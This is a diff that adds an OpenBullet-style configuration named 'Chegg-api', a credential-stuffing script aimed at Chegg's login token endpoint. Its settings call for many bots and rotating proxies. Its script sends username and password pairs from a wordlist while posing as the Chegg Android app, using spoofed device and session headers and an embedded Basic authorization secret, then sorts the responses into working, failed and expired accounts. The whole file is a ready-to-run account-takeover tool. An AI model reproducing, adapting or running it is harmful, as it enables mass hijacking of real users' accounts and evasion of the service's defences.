@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "Chegg-api",
+  "SuggestedBots": 99,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-01T13:12:45.800073+04:30",
+  "AdditionalInfo": "",
+  "Author": "MrD3v1L",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+REQUEST POST "https://proxy.chegg.com/oidc/token" 
+  CONTENT "password=<PASS>&username=<US>&source_page=android+Study+10.0.5%7Ccs&source_product=android%7Ccs&grant_type=password" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "X-PX-ORIGINAL-TOKEN: 3:39c4a14023e3393bd4330d3180098146c9b65af95bc9c6f8f1e76d76fbe1842f:q5GPpFnOs7MhvmqIPEABRuozr2BKAJcC6zNVLr+8HAO8RoScO/dCNp1qF4GPumR665BSUuRA+Ogfr9M3Zst/KQ==:1000:XqVkDHBipbOkbSK5bDOGQDk+bQNh3TKTWCTQYkR74Pxvm3sBuxORMw+GFsEhNGhK2maW802MA4ymesk9GMg8mNAzQNYGIhIclhAIG+3Kj4NVZQdkynFS8GplKq1SGDs+JMW8PDWgki/ocPR2CXJ6NB/v5QaPRHVjmGUbI30Jlok=" 
+  HEADER "X-PX-AUTHORIZATION: 3" 
+  HEADER "Authorization: Basic aGxEcFpBUEYwNW1xakFtZzdjcXRJS0xPaFVyeUI4cDE6dUJqemFrbXhHeDZXdHFBcg==" 
+  HEADER "X-CHEGG-DEVICEID: 429eb8a92cec054e86f3836adb5524b9473ecbf5" 
+  HEADER "X-CHEGG-SESSIONID: 34485ebe-fa5a-4b98-85a5-c671f4df3dca" 
+  HEADER "User-Agent: Chegg Study/10.0.5 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H)" 
+  HEADER "X-ADOBE-MC-ID: 12265249873246343530799170226976969418" 
+  HEADER "x-chegg-dfid: mobile|ddbab529-8bb3-3020-8832-1f426c606b3c" 
+  HEADER "x-chegg-auth-mfa-supported: true" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Content-Length: 136" 
+  HEADER "Host: proxy.chegg.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-NewRelic-ID: UQYGUlNVGwQCVFJTBwcD" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "404" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "The password is invalidated due to a long period of account inactivity. Please, reset your password" 
+
